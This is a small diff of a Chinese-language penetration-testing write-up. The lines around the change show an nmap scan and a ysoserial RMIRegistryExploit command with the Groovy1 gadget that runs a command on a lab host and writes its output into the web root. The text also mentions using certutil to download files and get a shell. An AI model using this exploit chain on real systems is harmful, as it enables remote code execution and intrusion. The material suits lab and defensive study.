@@ -171,8 +171,11 @@ nmap -p 10001,10002 -sC -sV 192.168.64.129
 java -cp ysoserial.jar  ysoserial.exploit.RMIRegistryExploit 192.168.64.129 10001 Groovy1 "cmd.exe /c whoami  > ..\webapps\ROOT\a.txt"
 ```
 ![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140421076-1914230851.png)
+
 访问
+
 ![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140437319-1239873008.png)
+
 利用 certutil 下载文件，可以getshell或直接上传exe再执行
 
 ```
